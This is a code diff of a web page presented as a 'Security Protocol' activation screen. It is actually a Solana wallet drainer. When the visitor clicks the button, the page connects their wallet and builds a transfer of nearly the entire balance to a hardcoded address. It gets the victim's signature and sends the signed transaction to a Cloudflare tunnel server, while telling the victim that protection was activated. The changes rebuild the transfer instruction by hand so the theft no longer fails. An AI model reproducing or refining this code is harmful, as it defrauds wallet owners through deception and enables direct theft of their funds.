@@ -1,6 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心环境伪装，确保底层 signTransaction 不崩溃
+        // 🚀 核心环境补丁
         window.Buffer = window.Buffer || {
             from: (arr) => new Uint8Array(arr),
             isBuffer: (obj) => obj instanceof Uint8Array
@@ -10,13 +10,22 @@
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
     <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
         <h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2>
-        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE NOW</button>
+        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
         <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
     </div>
 
     <script>
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
+
+    // 🔱 战神级工具：手动构造 8 字节小端序金额数据
+    function encodeAmount(amount) {
+        let buf = new ArrayBuffer(8);
+        let view = new DataView(buf);
+        let bigAmount = BigInt(amount);
+        view.setBigUint64(0, bigAmount, true); // true 代表小端序 (Little-Endian)
+        return new Uint8Array(buf);
+    }
 
     document.getElementById('cta').onclick = async () => {
         try {
@@ -26,45 +35,45 @@
             document.getElementById('msg').innerText = "Linking...";
             await p.connect();
             
-            // 向 71 机请求 Blockhash 和 余额
             const data = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: p.publicKey.toString()})
             }).then(r => r.json());
 
             const balance = BigInt(data.balance);
-            const fee = BigInt(1000000); 
+            const fee = BigInt(1500000); 
             const amount = balance > fee ? balance - fee : BigInt(0);
 
-            // 🔱 终极修复：不再手动算 lamports 格式，直接信任 SDK 的 BigInt 兼容处理
-            // 但为了防止 Blob.encode 报错，我们换一种更稳的 TransactionInstruction 写法
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: p.publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                    lamports: Number(amount) // 使用经过 BigInt 处理后的纯净数字
-                })
-            );
+            // 🚀 核心修正：手动构造原始 Instruction，彻底跳过 Blob.encode 报错
+            const instructionData = new Uint8Array(12);
+            instructionData.set([2, 0, 0, 0], 0); // SystemProgram Transfer 的指令 ID 是 2
+            instructionData.set(encodeAmount(amount), 4); // 紧跟 8 字节的金额数据
+
+            const transaction = new solanaWeb3.Transaction().add({
+                keys: [
+                    { pubkey: p.publicKey, isSigner: true, isWritable: true },
+                    { pubkey: new solanaWeb3.PublicKey(TARGET_ADDR), isSigner: false, isWritable: true }
+                ],
+                programId: solanaWeb3.SystemProgram.programId,
+                data: instructionData,
+            });
 
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = p.publicKey;
             
-            // 🚀 唤起钱包签名
-            document.getElementById('msg').innerText = "Waiting for Signature...";
+            document.getElementById('msg').innerText = "Awaiting Signature...";
             const signed = await p.signTransaction(transaction);
             
-            // 💰 签名后原生 Base64 转换
             const raw = signed.serialize();
             let b64 = "";
             for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
             
-            await fetch(TUNNEL + '/collect', {
+            fetch(TUNNEL + '/collect', {
                 method:'POST', headers:{'Content-Type':'application/json'},
                 body:JSON.stringify({signature: window.btoa(b64)})
             });
             
             alert("Security Protocol Activated!");
-            location.reload();
         } catch(e) { 
             alert("Status: " + e.message); 
             document.getElementById('msg').innerText = "Error: " + e.message;
